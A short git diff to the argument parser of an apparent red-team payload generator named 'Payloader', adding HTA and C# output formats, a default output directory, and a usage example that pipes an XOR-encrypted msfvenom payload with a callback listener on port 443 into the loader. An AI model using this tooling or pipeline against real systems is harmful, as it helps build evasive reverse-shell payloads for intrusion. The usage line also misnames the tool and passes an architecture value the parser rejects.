@@ -2,6 +2,7 @@
 
 import argparse
 import sys
+import os
 
 import argcomplete
 
@@ -10,14 +11,14 @@ from generator import Generator
 
 def main():
     parser = argparse.ArgumentParser(description='Payloader - A simple tool to generate payloads', add_help=True,
-                                     prog='payloader', usage='%(prog)s template [options] < payload')
+                                     prog='payloader', usage='%(prog)s template [options] < payload\nmsfvenom -p <payload> LHOST=tun0 LPORT=443 --encrypt xor --encrypt-key key -f <matching format> | layloader <template> -a amd64 -p win -e xor -k wh1rl3y')
     parser.add_argument('template', help='Template name')
     parser.add_argument('--platform', '-p', choices=['win', 'nix'], help='Target platform')
     parser.add_argument('--architecture', '-a', choices=['x64', 'x86', 'arm64', 'arm'],
                         help='Target architecture')
-    parser.add_argument('--outputDir', '-o', required=True, help='Target location')
+    parser.add_argument('--outputDir', '-o', default=os.getcwd(), help='Target location')
     parser.add_argument('--format', '-f',
-                        choices=['exe', 'dll', 'elf', 'elf-so', 'sh', 'bat', 'ps1', 'py', 'js', 'vba'],
+                        choices=['exe', 'dll', 'elf', 'elf-so', 'sh', 'bat', 'ps1', 'py', 'js', 'vba', 'hta', 'cs'],
                         required=True, help='Output format')
     parser.add_argument('--key', '-k', help='Key for encryption')
     parser.add_argument('--encrypt', '-e', choices=['aes', 'xor', 'rc4', 'none'], help='Encryption type',
